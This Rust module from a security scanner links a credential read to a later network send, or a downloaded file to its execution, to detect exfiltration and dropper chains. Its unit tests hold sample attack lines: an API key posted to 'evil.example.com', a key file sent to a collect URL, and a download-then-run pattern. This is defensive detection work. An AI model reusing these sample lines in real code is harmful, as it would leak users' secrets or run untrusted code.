//! Finding correlation: the one-hop data-flow check a line regex cannot make.
//!
//! prism-scanner's strongest single detection is its S8 rule: a value read
//! from a credential source (an API key taken from the environment, the
//! contents of an SSH private key) that flows into the payload of a network
//! send. It gets there with a
//! Python-only AST taint tracker. ADR-0005 rules out taint analysis in the
//! declarative corpus — and keeps the engine free of user code — so Sigil
//! makes the same call a different way: over the findings the content phases
//! already produced, in any language.
//!
//! A [`CorrelationRule`] names a *source* selector and a *sink* selector.
//! For every source finding and sink finding in the same file, at most
//! `window_lines` apart with the source first (or on the same line), the
//! link is established when
//!
//! 1. the source line *binds* a name and that name appears as a whole word
//!    in the sink's argument window (the sink line and the few lines after
//!    it, where a multi-line call keeps its arguments), or
//! 2. source and sink are the same line (`requests.post(u, json={"k":
//!    os.getenv("KEY")})`);
//!
//! and no `sink_excludes` substring appears in that window — `headers=` and
//! `Authorization` are where a key legitimately goes, and excluding them is
//! what keeps every ordinary API client from lighting up.
//!
//! A line binds a name by assigning to it (`key = os.getenv(...)`), by the
//! `as` name of a `with` item that *yields* data (`with open(KEY_PATH) as
//! keyfile`, `with urlopen(req) as response` — see [`with_handles`]), or by
//! naming the file it writes (see [`written_paths`]): `open(PATH, 'wb')`,
//! `urlretrieve(url, PATH)`, and the output operand of a download or archive
//! command (`curl -o "$OUT"`, `curl.exe ... -o "{out}"`, `wget -O`,
//! `Invoke-WebRequest -OutFile`, `tar -czf "$TARBALL"`) — a variable, or a
//! literal path such as `"/tmp/managed.pyz"` that the sink repeats. The file
//! binding is what connects a download to the later line that runs the
//! downloaded file, and a project archive to the later line that uploads it:
//! in both, what travels between the two lines is a path, not an assigned
//! expression.
//!
//! Two bindings are deliberately *not* made, because the data flows the
//! other way:
//!
//! - the handle of a file opened for writing (`with open(p, 'w') as out`)
//!   receives data. A login helper that opens `~/.netrc` for writing and then
//!   posts to the auth endpoint writes the *response* into the handle; binding
//!   the handle would report that as the credential file reaching the send.
//! - a sink that *runs a file* (behaviour `executes_program`: an interpreter
//!   on a path, `Start-Process`, `os.startfile`) is linked only through a file
//!   the source line wrote, named on the launch line itself. What an HTTP call
//!   assigns (`data = client.get(u).json()`) and then hands to a local script
//!   as input is an argument to that script, not the program that runs.
//!
//! Correlation reads rule ids, never severities: a Low observation (an HTTP
//! client call, a subprocess launch, an environment read) is as good a source
//! or sink as a High finding, and the chain carries its own severity.
//!
//! The result is a new finding at the sink line whose snippet names both
//! ends of the chain, so the report explains itself: `Credential read
//! (CRED-012 @L9) reaches network send (NET-001 @L10)`.

use std::sync::OnceLock;

use regex::Regex;

use crate::corpus::schema::CorrelationRule;

use super::{Finding, Phase, Severity};

/// Lines after the sink line that still count as the sink's arguments.
const SINK_ARG_WINDOW: usize = 5;

fn assignment_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // `name = ...`, `const name = ...`, `let name: T = ...`, `self.name = ...`,
        // `name := ...`. The identifier captured is the last dotted segment.
        Regex::new(
            r"^\s*(?:(?:const|let|var|export|local|my|our|\$)\s+)?(?:[A-Za-z_][A-Za-z0-9_]*\.)*([A-Za-z_][A-Za-z0-9_]*)\s*(?::\s*[A-Za-z0-9_\[\]<>|, ]+)?\s*(?::=|=)[^=]",
        )
        .expect("assignment regex compiles")
    })
}

/// The identifier a source line assigns to, if it is an assignment.
pub fn assigned_identifier(line: &str) -> Option<&str> {
    assignment_re()
        .captures(line)
        .and_then(|c| c.get(1))
        .map(|m| m.as_str())
}

/// A file opened for writing: `open(PATH, 'wb')`, `open(self.path, "a")`,
/// `open(path, mode="w")`. Captures the last segment of the path expression
/// when it is a (possibly dotted) identifier; a literal path is not a name
/// the sink could repeat as an identifier.
fn open_for_write_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"\bopen\s*\(\s*(?:[A-Za-z_][A-Za-z0-9_]*\.)*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*(?:mode\s*=\s*)?[rbtuf]*["'][rbt]*[wax][bt+]*["']"#,
        )
        .expect("open-for-write regex compiles")
    })
}

/// `with a as x, b as y:` — the names a `with` statement binds.
fn with_as_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\bas\s+([A-Za-z_][A-Za-z0-9_]*)\s*[,:)]").expect("with-as regex compiles")
    })
}

/// `urlretrieve(url, PATH)` / `urllib.request.urlretrieve(url, filename=PATH)`.
fn urlretrieve_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"\burlretrieve\s*\([^,\n]+,\s*(?:filename\s*=\s*)?(?:[A-Za-z_][A-Za-z0-9_]*\.)*([A-Za-z_][A-Za-z0-9_]*)\s*[,)]",
        )
        .expect("urlretrieve regex compiles")
    })
}

/// The output operand of a download or archive command, in shell, in
/// PowerShell, or inside a Python/JS string that builds one:
/// `curl -o "$OUT"`, `curl.exe -L <url> -o "{output_file}"`,
/// `wget -O "${dest}"`, `Invoke-WebRequest <url> -OutFile $path`,
/// `tar -czf "$TARBALL" ...`. Only variable references are captured here
/// (`$X`, `${X}`, `{X}`; `$env:X` is left alone); literal paths are
/// [`literal_target_re`]'s, which takes only paths that cannot be mistaken
/// for an ordinary word.
fn output_operand_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(?:\s(?:-o|-O|--output|--output-document|-OutFile|--file)|\btar\s+-?[A-Za-z]*c[A-Za-z]*f)(?:\s+|=)["']?(?:\$\{|\$|\{)([A-Za-z_][A-Za-z0-9_]*)"#,
        )
        .expect("output-operand regex compiles")
    })
}

/// A literal file path a line writes: `open("/tmp/x.pyz", "wb")`,
/// `urlretrieve(url, "/tmp/managed.pyz")`, `curl -o /tmp/install.sh`,
/// `wget -O ./payload.exe`. Only a path with a directory separator, or a file
/// name with an executable or archive extension, is captured — a bare word is
/// too common to link on.
fn literal_target_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(?:\burlretrieve\s*\([^,\n]+,\s*(?:filename\s*=\s*)?["']|(?:\s(?:-o|-O|--output|--output-document|-OutFile)|\btar\s+-?[A-Za-z]*c[A-Za-z]*f)(?:\s+|=)["']?)((?:~|\.{1,2})?/[^\s"';|&)]+|[A-Za-z0-9_.-]+\.(?:sh|py|pyz|pyc|js|exe|ps1|bat|cmd|msi|jar|bin|run|AppImage|dll|so|dylib|tgz|zip))(?:["']?\s*[,)]|["']?\s|["']?$)"#,
        )
        .expect("literal-target regex compiles")
    })
}

/// `open("/tmp/x.pyz", "wb")`: a literal path opened for writing.
fn literal_open_for_write_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"\bopen\s*\(\s*["']((?:~|\.{1,2})?/[^"'\n]+|[A-Za-z0-9_.-]+\.(?:sh|py|pyz|pyc|js|exe|ps1|bat|cmd|msi|jar|bin|run|AppImage|dll|so|dylib))["']\s*,\s*(?:mode\s*=\s*)?[rbtuf]*["'][rbt]*[wax][bt+]*["']"#,
        )
        .expect("literal-open regex compiles")
    })
}

/// Any `open(...)` whose mode writes: `'w'`, `"ab"`, `mode="x"`, `'wb+'`.
/// Used to tell a `with` item that receives data from one that yields it;
/// the path expression may be any call (`open(os.path.expanduser(p), 'w')`).
fn write_mode_open_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r#"\bopen\s*\([^\n]*?,\s*(?:mode\s*=\s*)?["'][rbt]*[wax][rbt+]*["']"#)
            .expect("write-mode open regex compiles")
    })
}

/// Push `s` unless it is a one-character name or already present.
///
/// One-character names (`with open(p, "wb") as f`) are dropped: `f`, `r` and
/// `b` are also string prefixes, so `f"..."` in the sink window would read as
/// a use of the file handle.
fn push_binding<'a>(out: &mut Vec<&'a str>, s: &'a str) {
    if s.len() > 1 && !out.contains(&s) {
        out.push(s);
    }
}

/// The files a line writes, named the way a later line would name them
/// again: `open(PATH, 'wb')`, `urlretrieve(url, PATH)`, the output operand of
/// `curl -o` / `wget -O` / `-OutFile` / `tar -c…f`, or a literal path with a
/// directory or an executable extension. See the module documentation.
pub fn written_paths(line: &str) -> Vec<&str> {
    let res: [&Regex; 5] = [
        open_for_write_re(),
        urlretrieve_re(),
        output_operand_re(),
        literal_target_re(),
        literal_open_for_write_re(),
    ];
    let mut out: Vec<&str> = Vec::new();
    for re in res {
        for c in re.captures_iter(line) {
            if let Some(m) = c.get(1) {
                // A device is not a file anyone runs or uploads afterwards:
                // `curl -o /dev/null <health-check>` writes nothing, and
                // `/dev/null` recurs on unrelated lines (`>/dev/null`).
                if m.as_str().starts_with("/dev/") {
                    continue;
                }
                push_binding(&mut out, m.as_str());
            }
        }
    }
    out
}

/// The `as` names of a `with` statement whose item *yields* data: a file
/// opened for reading, a response, any other context manager. The handle of
/// a file opened for writing receives data, so it is not bound — see the
/// module documentation.
pub fn with_handles(line: &str) -> Vec<&str> {
    let trimmed = line.trim_start();
    if !(trimmed.starts_with("with ") || trimmed.starts_with("async with ")) {
        return Vec::new();
    }
    let mut out: Vec<&str> = Vec::new();
    let mut item_start = 0;
    for c in with_as_re().captures_iter(line) {
        let (Some(whole), Some(name)) = (c.get(0), c.get(1)) else {
            continue;
        };
        let item = &line[item_start..whole.start()];
        item_start = whole.end();
        if write_mode_open_re().is_match(item) {
            continue;
        }
        push_binding(&mut out, name.as_str());
    }
    out
}

/// The files a line writes and the data handles it opens: everything a line
/// binds besides an assignment.
pub fn written_targets(line: &str) -> Vec<&str> {
    let mut out = written_paths(line);
    for h in with_handles(line) {
        push_binding(&mut out, h);
    }
    out
}

/// Every name a source line binds: its assignment target, then the files it
/// writes and the data handles it opens.
fn source_bindings(line: &str) -> Vec<&str> {
    let mut out: Vec<&str> = Vec::new();
    if let Some(ident) = assigned_identifier(line) {
        out.push(ident);
    }
    for t in written_targets(line) {
        if !out.contains(&t) {
            out.push(t);
        }
    }
    out
}

/// Whether a sink *runs a file*: then only a file the source line wrote can
/// link to it (see the module documentation).
fn runs_a_file(rule_id: &str) -> bool {
    super::profile::behavior_for(rule_id) == Some("executes_program")
}

/// Does `ident` appear as a whole word in `text`?
fn contains_word(text: &str, ident: &str) -> bool {
    let bytes = text.as_bytes();
    let mut start = 0;
    while let Some(pos) = text[start..].find(ident) {
        let at = start + pos;
        let end = at + ident.len();
        let before_ok = at == 0 || !is_ident_byte(bytes[at - 1]);
        let after_ok = end >= bytes.len() || !is_ident_byte(bytes[end]);
        if before_ok && after_ok {
            return true;
        }
        start = at + 1;
    }
    false
}

fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// Run every correlation rule over one file's findings.
///
/// `lines` are the file's lines (already normalised for matching), used to
/// read the source assignment and the sink argument window. Returns only the
/// new chain findings; the caller appends them.
pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) -> Vec<Finding> {
    let mut out: Vec<Finding> = Vec::new();
    if rules.is_empty() || findings.len() < 2 {
        return out;
    }

    for rule in rules {
        let Some(phase) = Phase::from_name(&rule.phase) else {
            continue;
        };
        let severity = parse_severity(&rule.severity);
        let weight = rule.weight.unwrap_or_else(|| phase.default_weight());

        let sources: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.line.is_some() && rule.source.accepts(&f.rule))
            .collect();
        if sources.is_empty() {
            continue;
        }
        let sinks: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.line.is_some() && rule.sink.accepts(&f.rule))
            .collect();

        let mut emitted: Vec<(usize, usize)> = Vec::new();
        for sink in &sinks {
            let sink_line = sink.line.unwrap_or(0);
            let window = arg_window(lines, sink_line);
            let file_only = runs_a_file(&sink.rule);
            // A launch names its program on its own line (the launch rule
            // matches interpreter and operand together), so the lines after
            // it are not its program: `>/dev/null` or `input=data` there is
            // not what runs.
            let link_text: &str = if file_only {
                lines.get(sink_line.wrapping_sub(1)).copied().unwrap_or("")
            } else {
                &window
            };
            if rule
                .sink_excludes
                .iter()
                .any(|x| window.contains(x.as_str()))
            {
                continue;
            }
            for source in &sources {
                let source_line = source.line.unwrap_or(0);
                if source_line > sink_line || sink_line - source_line > rule.window_lines {
                    continue;
                }
                let linked = if source_line == sink_line {
                    true
                } else {
                    lines.get(source_line.wrapping_sub(1)).is_some_and(|l| {
                        let bound = if file_only {
                            written_paths(l)
                        } else {
                            source_bindings(l)
                        };
                        bound.iter().any(|ident| contains_word(link_text, ident))
                    })
                };
                if !linked {
                    continue;
                }
                let key = (source_line, sink_line);
                if emitted.contains(&key) {
                    continue;
                }
                emitted.push(key);
                out.push(Finding {
                    phase,
                    rule: rule.id.clone(),
                    severity,
                    file: sink.file.clone(),
                    line: Some(sink_line),
                    snippet: format!(
                        "{}: {} (@L{}) reaches {} (@L{}): {}",
                        rule.description,
                        source.rule,
                        source_line,
                        sink.rule,
                        sink_line,
                        truncate(
                            lines
                                .get(sink_line.wrapping_sub(1))
                                .map_or("", |l| l.trim())
                        )
                    ),
                    weight,
                    kev: false,
                    epss: 0.0,
                    fingerprint: String::new(),
                    locator: sink.locator.clone(),
                    evidence: Default::default(),
                });
            }
        }
    }
    out
}

/// The sink line plus the lines that can still carry its arguments.
fn arg_window(lines: &[&str], sink_line: usize) -> String {
    if sink_line == 0 {
        return String::new();
    }
    let start = sink_line - 1;
    let end = lines.len().min(start + SINK_ARG_WINDOW);
    lines
        .get(start..end)
        .map(|w| w.join("\n"))
        .unwrap_or_default()
}

fn truncate(s: &str) -> String {
    const LIMIT: usize = 120;
    if s.len() <= LIMIT {
        return s.to_string();
    }
    let end = s
        .char_indices()
        .take_while(|(i, _)| *i < LIMIT)
        .last()
        .map(|(i, ch)| i + ch.len_utf8())
        .unwrap_or(0);
    format!("{} ...", &s[..end])
}

fn parse_severity(s: &str) -> Severity {
    match s.to_lowercase().as_str() {
        "critical" => Severity::Critical,
        "high" => Severity::High,
        "medium" => Severity::Medium,
        _ => Severity::Low,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::corpus::schema::FindingSelector;

    fn rule() -> CorrelationRule {
        CorrelationRule {
            id: "EXFIL-CHAIN-001".to_string(),
            phase: "network_exfil".to_string(),
            severity: "critical".to_string(),
            description: "Credential read reaches a network send".to_string(),
            weight: Some(10),
            source: FindingSelector {
                rule_prefixes: vec!["CRED-".to_string()],
                rule_ids: vec![],
            },
            sink: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["NET-001".to_string(), "NET-004".to_string()],
            },
            window_lines: 20,
            sink_excludes: vec!["headers".to_string(), "Authorization".to_string()],
            remediation: None,
            references: vec![],
            tags: vec![],
        }
    }

    fn f(rule: &str, line: usize) -> Finding {
        Finding {
            phase: Phase::Credentials,
            rule: rule.to_string(),
            severity: Severity::Low,
            file: "a.py".to_string(),
            line: Some(line),
            snippet: String::new(),
            weight: 1,
            kev: false,
            epss: 0.0,
            fingerprint: String::new(),
            locator: None,
            evidence: Default::default(),
        }
    }

    #[test]
    fn assignment_identifiers() {
        // sigil:ignore-next-line CRED-001 -- test input string, not a read
        assert_eq!(
            assigned_identifier("api_key = os.getenv(\"OPENAI_API_KEY\")"),
            Some("api_key")
        );
        assert_eq!(
            assigned_identifier("const token = process.env.TOKEN;"),
            Some("token")
        );
        assert_eq!(
            assigned_identifier("let key: string = process.env.KEY!"),
            Some("key")
        );
        assert_eq!(
            assigned_identifier("self.secret = os.environ['SECRET']"),
            Some("secret")
        );
        assert_eq!(assigned_identifier("if a == b:"), None);
        assert_eq!(assigned_identifier("requests.post(url, json=data)"), None);
    }

    /// prism's fixture, lines 9-10: the key read on one line is the payload of
    /// the post on the next.
    #[test]
    fn links_assignment_to_payload() {
        let src = "import os\napi_key = os.getenv(\"OPENAI_API_KEY\")\nrequests.post(\"https://evil.example.com/c\", json={\"key\": api_key})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 2), f("NET-001", 3)];
        let chains = apply(&[rule()], &findings, &lines);
        assert_eq!(chains.len(), 1, "{chains:#?}");
        assert_eq!(chains[0].rule, "EXFIL-CHAIN-001");
        assert_eq!(chains[0].line, Some(3));
        assert_eq!(chains[0].severity, Severity::Critical);
        assert_eq!(chains[0].weight, 10);
        assert!(chains[0]
            .snippet
            .contains("CRED-012 (@L2) reaches NET-001 (@L3)"));
    }

    /// The ordinary API client: key read, then used in an auth header. No chain.
    #[test]
    fn auth_header_use_is_not_exfiltration() {
        let src = "token = os.environ[\"API_TOKEN\"]\nresp = requests.get(url, headers={\"Authorization\": f\"Bearer {token}\"})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
    }

    /// Proximity alone is not a link: an unrelated request near a key read.
    #[test]
    fn unrelated_nearby_request_is_not_a_chain() {
        let src =
            "key = os.environ[\"SECRET_KEY\"]\nrequests.get(\"https://example.com/status\")\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
    }

    #[test]
    fn multiline_call_arguments_are_in_the_window() {
        let src = "secret = os.getenv(\"AWS_SECRET_ACCESS_KEY\")\nrequests.post(\n    url,\n    data={\"s\": secret},\n)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
    }

    #[test]
    fn same_line_source_and_sink_link() {
        let src = "requests.post(url, json={\"k\": os.getenv(\"API_KEY\")})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 1)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
    }

    #[test]
    fn window_and_order_are_enforced() {
        let mut src = String::from("key = os.getenv(\"API_KEY\")\n");
        for _ in 0..25 {
            src.push_str("pass\n");
        }
        src.push_str("requests.post(url, json={\"k\": key})\n");
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 27)];
        assert!(
            apply(&[rule()], &findings, &lines).is_empty(),
            "outside window"
        );

        let src2 = "requests.post(url, json={\"k\": key})\nkey = os.getenv(\"API_KEY\")\n";
        let lines2: Vec<&str> = src2.lines().collect();
        let findings2 = vec![f("NET-001", 1), f("CRED-012", 2)];
        assert!(
            apply(&[rule()], &findings2, &lines2).is_empty(),
            "sink before source"
        );
    }

    /// The write-target binder: each form names the file the line writes.
    /// (The end-to-end download→run and archive→upload chains are tested in
    /// `corpus::engine::reconcile`, which is excluded from the self-scan; the
    /// strings here are chosen so no content rule fires on this file.)
    #[test]
    fn written_targets_name_the_file_a_line_writes() {
        // The written path and the handle that yields data are bound; the
        // handle of the file opened for writing receives data and is not.
        assert_eq!(
            written_targets("    with src as response, open(PATH, 'wb') as out_file:"),
            vec!["PATH", "response"]
        );
        assert_eq!(
            written_paths("    with src as response, open(PATH, 'wb') as out_file:"),
            vec!["PATH"]
        );
        assert_eq!(
            written_targets("fh = open(self.dest, mode=\"ab\")"),
            vec!["dest"]
        );
        assert_eq!(
            written_targets("urlretrieve(url, filename=target_path)"),
            vec!["target_path"]
        );
        assert_eq!(
            written_targets(r#"cmd = f'fetch.exe -L {url} -o "{output_file}"'"#),
            vec!["output_file"]
        );
        assert_eq!(
            written_targets(r#"    tar -czf "$TARBALL" -C "$PROJECT_PATH" ."#),
            vec!["TARBALL"]
        );
        assert_eq!(
            written_targets("fetch-tool -OutFile $installer"),
            vec!["installer"]
        );
        // A read binds its handle (the data it yields), never its path; a
        // bare word after `-o` is not a path anyone can be sure of.
        assert_eq!(
            written_targets("with open(path) as handle:"),
            vec!["handle"]
        );
        assert!(written_paths("with open(path) as handle:").is_empty());
        assert!(written_targets("with open(os.path.expanduser(p), 'w') as out:").is_empty());
        assert!(!written_targets("data = open(path, 'rb').read()").contains(&"path"));
        assert!(written_targets("fetch-tool -o out").is_empty());
        // A literal path with a directory, or an executable file name, is
        // bound as written: `-o /tmp/x`, `urlretrieve(url, "/tmp/x.pyz")`.
        assert_eq!(
            written_targets("fetch-tool -o /tmp/out.bin"),
            vec!["/tmp/out.bin"]
        );
        assert_eq!(
            written_targets(r#"retrieve_it = open("/tmp/stage.pyz", "wb")"#),
            vec!["/tmp/stage.pyz"]
        );
        // The assignment is bound too, by `source_bindings`.
        assert_eq!(
            source_bindings(r#"retrieve_it = open("/tmp/stage.pyz", "wb")"#),
            vec!["retrieve_it", "/tmp/stage.pyz"]
        );
        assert!(written_targets(r#"text = open("/etc/hosts").read()"#).is_empty());
        // Output discarded to a device writes no file a later line can use.
        assert!(written_paths("fetch-tool -fsS -o /dev/null \"$CHECK_URL\"").is_empty());
        // One-letter handles collide with string prefixes (f"...", r"...").
        assert!(written_targets("with open(dest, 'w') as f:") == vec!["dest"]);
    }

    /// A path written on one line and used on the next links through the
    /// write binding, not only through an assignment.
    #[test]
    fn write_binding_links_like_an_assignment() {
        let src = "with src as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\nrun([\"tool\", PATH])\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 3)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
        // The same shape with a different path does not link.
        let src2 = "with src as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\nrun([\"tool\", OTHER])\n";
        let lines2: Vec<&str> = src2.lines().collect();
        assert!(apply(&[rule()], &findings, &lines2).is_empty());
    }

    /// A file opened for writing receives data. A login helper that opens a
    /// credential file for writing and then calls the auth endpoint writes the
    /// response into the handle — the opposite direction to exfiltration, and
    /// not a chain (it was one while write handles were bound).
    #[test]
    fn a_write_handle_is_not_a_source_of_data() {
        let src = "    with open(os.path.expanduser(NETRC), 'w') as netrc_file:\n        resp = post(LOGIN_URL, json=creds)\n        netrc_file.write(resp.json()['token'])\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-031", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
        // The same line opened for reading yields the file's contents, and
        // sending them is the chain.
        let read = "    with open(os.path.expanduser(KEYFILE)) as key_file:\n        post(COLLECT_URL, data=key_file.read())\n";
        let lines_r: Vec<&str> = read.lines().collect();
        assert_eq!(apply(&[rule()], &findings, &lines_r).len(), 1);
    }

    fn launch_rule() -> CorrelationRule {
        CorrelationRule {
            id: "DROPPER-CHAIN-001".to_string(),
            severity: "high".to_string(),
            description: "Downloaded file is executed".to_string(),
            weight: Some(5),
            source: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["NET-001".to_string(), "NET-002".to_string()],
            },
            sink: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["CODE-RUNFILE-001".to_string()],
            },
            sink_excludes: vec![],
            ..rule()
        }
    }

    /// A sink that runs a file links only through a file the source wrote:
    /// downloaded *data* handed to a local script is that script's input, not
    /// the program that runs.
    #[test]
    fn a_launch_links_only_through_a_written_file() {
        let data = "data = get(JOBS_URL).json()\nfor job in data:\n    print(job)\nproc = run([interp, helper_script],\n           input=dumps(data))\n";
        let lines: Vec<&str> = data.lines().collect();
        let findings = vec![f("NET-001", 1), f("CODE-RUNFILE-001", 4)];
        assert!(apply(&[launch_rule()], &findings, &lines).is_empty());
        // The download writes PATH and the launch runs PATH: the chain.
        let dropper = "with urlopen(req) as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\nrun([interp, PATH])\n";
        let lines_d: Vec<&str> = dropper.lines().collect();
        let findings_d = vec![f("NET-002", 1), f("CODE-RUNFILE-001", 3)];
        assert_eq!(apply(&[launch_rule()], &findings_d, &lines_d).len(), 1);
        // The response handle reaching the launch's arguments is not a link.
        let handle = "with urlopen(req) as response:\n    pass\nrun([interp, helper_script], input=response.read())\n";
        let lines_h: Vec<&str> = handle.lines().collect();
        assert!(apply(&[launch_rule()], &findings_d, &lines_h).is_empty());
    }

    #[test]
    fn contains_word_is_whole_word() {
        assert!(contains_word("json={\"k\": api_key}", "api_key"));
        assert!(!contains_word("json={\"k\": api_key2}", "api_key"));
        assert!(!contains_word("my_api_key", "api_key"));
    }
}
